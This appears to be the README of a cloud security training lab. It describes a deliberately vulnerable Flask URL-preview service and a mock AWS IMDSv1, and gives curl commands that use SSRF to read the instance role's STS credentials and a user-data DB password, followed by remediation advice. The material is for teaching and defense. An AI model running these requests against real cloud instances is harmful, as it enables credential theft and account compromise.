Cloud Lab 04. AWS-IMDS-SSRF-CredTheft — Flask (Python), self-contained  ✅ (exploit verified on this box)

A "URL Preview" web service with a classic SSRF sink and NO egress controls. It
runs on a (simulated) EC2 instance whose Instance Metadata Service is IMDSv1 —
no session token, default hop limit — so a server-side request to the link-local
address 169.254.169.254 walks straight into the instance role's temporary STS
credentials and the plaintext user-data bootstrap script (which hardcodes a DB
password). The mock IMDS runs on 127.0.0.1:9100 and the app maps the real
169.254.169.254 to it, so the exploit uses the authentic metadata URL — rootless.

1: Get the lab:   unzip AWS-IMDS-SSRF-CredTheft.zip && cd 04-AWS-IMDS-SSRF-CredTheft
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9101/          <-- {"app":"URL Preview Service",...}
   # Quick win — SSRF -> IMDS -> steal role creds + user-data secret:
   curl 'localhost:9101/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
   #   -> s3-backup-role
   curl 'localhost:9101/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-backup-role'
   #   -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":...}
   curl 'localhost:9101/preview?url=http://169.254.169.254/latest/user-data'
   #   -> bootstrap script incl.  export DB_PASS=Sup3rSecret-Prod-DB-Pw!
3: Stop:  Ctrl-C  (or kill the app.py process)

Requirements:
    Python 3 + Flask                (native run — no Docker, no cloud account)
    curl                            (any HTTP client works)

Endpoints:
    GET  /                          -> app banner
    GET  /preview?url=<http url>     -> server fetches the URL for you   [SSRF SINK]
    (internal mock IMDS on 127.0.0.1:9100 — reached only via 169.254.169.254)

List of Vulnerabilities (all verified on this box):
    SSRF — /preview fetches any attacker-supplied URL, no allowlist, no block on
        link-local / metadata addresses.
    IMDSv1 exposure — metadata served over plain GET with no token requirement,
        so a single SSRF request reads it (IMDSv2 would need a PUT-issued token).
    Instance-role credential theft — SSRF -> /iam/security-credentials/<role>
        returns live STS AccessKeyId/SecretAccessKey/Token.
    Secret in EC2 user-data — the bootstrap script embeds a plaintext DB password.

Remediation: enforce IMDSv2 (HttpTokens=required) + hop limit 1; validate/allowlist
SSRF egress and block 169.254.169.254; never put secrets in user-data.
